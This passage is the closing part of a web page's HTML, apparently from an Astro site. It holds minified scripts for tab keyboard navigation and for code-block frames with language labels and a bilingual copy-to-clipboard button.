if(e.key===`Home`)i=0;else if(e.key===`End`)i=t.length-1;else return;e.preventDefault(),t[i].click()}),r.appendChild(s)}),e.prepend(r)})};e(),document.addEventListener(`astro:page-load`,e);</script><script type="module">var e=()=>{let e=document.documentElement.lang===`es`?{copy:`Copiar`,copied:`Copiado`}:{copy:`Copy`,copied:`Copied`};document.querySelectorAll(`pre`).forEach(t=>{if(t.closest(`.pub-filetree`)||t.parentElement?.classList.contains(`code-frame`))return;let n=document.createElement(`div`);n.className=`code-frame`,t.parentNode?.insertBefore(n,t),n.appendChild(t);let r=t.dataset.language??t.querySelector(`code`)?.className.match(/language-([\w-]+)/)?.[1];if(r){let e=document.createElement(`span`);e.className=`code-language`,e.textContent=r===`powershell`?`PowerShell`:r,n.appendChild(e)}let i=document.createElement(`button`);i.className=`copy-code`,i.type=`button`,i.textContent=e.copy,i.addEventListener(`click`,async()=>{try{await navigator.clipboard.writeText(t.textContent??``),i.textContent=e.copied,window.setTimeout(()=>{i.textContent=e.copy},1400)}catch{i.textContent=e.copy}}),n.appendChild(i)})};e(),document.addEventListener(`astro:page-load`,e);</script></body></html>
